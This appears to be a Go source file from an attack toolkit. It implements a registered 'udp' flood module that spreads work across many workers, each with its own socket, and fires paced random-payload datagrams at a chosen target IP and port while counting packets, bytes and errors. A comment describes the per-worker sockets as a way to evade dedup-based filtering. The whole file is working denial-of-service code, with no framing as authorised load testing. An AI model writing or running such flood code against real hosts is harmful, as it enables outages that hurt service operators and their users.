package attack

import (
	"context"
	"crypto/rand"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
)

// udpFlood hammers the target port with UDP datagrams. Each worker owns its own
// socket, so source ports are distinct — better against dedup-based filters.
type udpFlood struct {
	packets, bytes, errs atomic.Uint64
}

func init() { Register("udp", func() Attack { return &udpFlood{} }) }

func (u *udpFlood) Name() string { return "udp" }

func (u *udpFlood) Start(ctx context.Context, opts Options) error {
	payload := opts.Payload
	if payload <= 0 {
		payload = 64
	}
	if payload > 1400 {
		payload = 1400
	}
	wireSize := payload + 28 // UDP(8) + IPv4(20)

	dst, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(opts.Target.String(), fmt.Sprint(int(opts.Port))))
	if err != nil {
		return err
	}

	workers := opts.Workers
	if workers <= 0 {
		workers = autoWorkers()
	}
	interval := perWorkerInterval(workers, opts.PPS)

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			c, err := net.DialUDP("udp4", nil, dst)
			if err != nil {
				u.errs.Add(1)
				return
			}
			defer c.Close()

			// One random buffer per worker; content variety is a Phase 3 concern.
			buf := make([]byte, payload)
			rand.Read(buf)

			paceLoop(ctx, interval, func() {
				if _, err := c.Write(buf); err != nil {
					u.errs.Add(1)
					return
				}
				u.packets.Add(1)
				u.bytes.Add(uint64(wireSize))
			})
		}()
	}
	wg.Wait()
	return nil
}

func (u *udpFlood) Stats() Stats {
	return Stats{Packets: u.packets.Load(), Bytes: u.bytes.Load(), Errors: u.errs.Load()}
}
